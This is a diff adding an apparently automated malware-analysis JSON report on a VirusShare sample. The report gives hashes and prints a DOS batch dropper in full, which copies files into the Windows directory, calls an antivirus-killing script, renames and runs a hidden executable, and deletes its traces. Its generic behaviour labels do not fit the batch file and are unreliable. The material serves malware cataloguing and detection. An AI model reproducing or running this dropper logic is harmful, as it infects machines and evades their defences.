@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\ncls\nif exist c:\\windows\\command.com goto win98\ncopy *.* c:\\winnt\ncd \\\ncd winnt\ncall AVkill.bat\ncd \\\ncd winnt\nren t.zip *.exe\nt.exe\ndel ke.bat\ncd \\\ndel temp\ndel *.zip\ndel *.bat\nexit\n\n:win98\ncopy *.* c:\\windows\ncd \\\ncd windows\ncall AVkill.bat\ncd \\\ncd windows\nren t.zip *.exe\nt.exe\ncd \\\ncd temp\ndel *.zip\ndel *.bat\nexit"
+    },
+    "filename": "VirusShare_07492207288948dc72b54b989ab59efa",
+    "filesize": 359,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "07492207288948dc72b54b989ab59efa",
+        "sha1": "d09d2e22d91a4cf4177445602043c0d609584afb",
+        "sha256": "e47e5ada361685ce386244fa30c01b344dacae4c3cacb4847dff9f83b1059251"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if exist c:\\windows\\command.com goto win98",
+            "copy *.* c:\\winnt",
+            "cd \\",
+            "cd winnt",
+            "call AVkill.bat",
+            "cd \\",
+            "cd winnt",
+            "ren t.zip *.exe",
+            "t.exe",
+            "del ke.bat",
+            "cd \\",
+            "del temp",
+            "del *.zip",
+            "del *.bat",
+            "exit",
+            ":win98",
+            "copy *.* c:\\windows",
+            "cd \\",
+            "cd windows",
+            "call AVkill.bat",
+            "cd \\",
+            "cd windows",
+            "ren t.zip *.exe",
+            "t.exe",
+            "cd \\",
+            "cd temp",
+            "del *.zip",
+            "del *.bat",
+            "exit"
+        ],
+        "file": {
+            "del *.zip": "Compressed",
+            "ren t.zip *.exe": "Executable",
+            "t.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.256686",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
